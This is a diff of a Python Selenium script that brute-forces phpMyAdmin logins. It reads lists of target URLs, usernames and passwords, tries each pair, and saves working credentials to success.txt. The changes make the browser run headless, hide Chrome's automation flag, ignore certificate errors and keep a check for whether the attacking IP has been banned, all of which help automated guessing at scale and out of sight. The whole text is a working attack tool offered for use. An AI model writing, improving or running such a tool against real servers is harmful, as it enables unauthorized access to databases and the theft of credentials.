@@ -47,11 +47,11 @@ def test_url(url):
 
 def bf(url, username, password):
     chrome_options = Options()
-    # chrome_options.add_argument('--headless')  # 启用headless模式，不显示浏览器界面
-    # chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--disable-infobars')  # 去除“chrome正受到自动测试软件的控制”提示
+    chrome_options.add_argument('--headless')  # 启用headless模式，不显示浏览器界面
+    chrome_options.add_argument('--disable-gpu')
+    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation',
+                                                               'enable-logging'])  # 去除“chrome正受到自动测试软件的控制”提示,去除chromedriver的日志打印
     chrome_options.add_argument('--ignore-certificate-errors')  # 消除“不是私密连接”错误
-    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])  # 去除chromedriver的日志打印
     browser = webdriver.Chrome(options=chrome_options)
     browser.get(url)
     user_tag = browser.find_element_by_name("pma_username")
@@ -64,7 +64,7 @@ def bf(url, username, password):
         username_tag = browser.find_element_by_name("pma_username")
         print(url + "\t" + username + "\t" + password + "失败")
     except:
-        if (test_url(url) == True):  # 检查IP是否被禁
+        if test_url(url):  # 检查IP是否被禁
             with open("success.txt", "a", encoding='utf-8') as f1:
                 f1.write(url + "  |  " + username + "  |  " + password + "\n")
             print(url + "\t" + username + "\t" + password + "成功")
@@ -78,16 +78,15 @@ def bf(url, username, password):
         browser.quit()
 
 
-pool = ThreadPoolExecutor(max_workers=1)  # 设置线程池大小
+pool = ThreadPoolExecutor(max_workers=1)  # 设置线程池大小，即同时开几个窗口
 urls_success = []
 urls_fail = []
 
 if __name__ == '__main__':
-    with open(userdic, "r", encoding='utf-8') as f1, open(passdic, "r", encoding='utf-8')as f2, open(urldic, "r",
-                                                                                                     encoding='utf-8') as f3:
+    with open(userdic) as f1, open(passdic)as f2, open(urldic) as f3:
         for url in f3:
             url = url.strip()
-            if (test_url(url) == True):
+            if test_url(url):
                 urls_success.append(url)
             else:
                 urls_fail.append(url)
